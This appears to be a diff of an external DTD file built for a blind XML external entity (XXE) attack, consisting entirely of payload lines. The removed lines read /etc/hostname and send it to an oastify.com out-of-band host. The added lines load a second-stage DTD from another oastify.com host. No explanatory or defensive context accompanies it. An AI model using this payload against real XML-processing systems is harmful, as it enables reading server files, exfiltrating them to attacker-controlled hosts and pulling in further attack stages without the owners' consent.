@@ -1,2 +1,5 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://064ee69b5ko5slknztphsf5g278ywtki.oastify.com/?d=%file;'>">
+<!ENTITY % declare_ping "<!ENTITY &#x25; ping SYSTEM 'https://jh4xppkug3zo34v6ac003ygzdqjh7dv2.oastify.com/xxe-stage2.dtd'>">
+%declare_ping;
+%ping;
+
+<!ELEMENT submission (#PCDATA)>
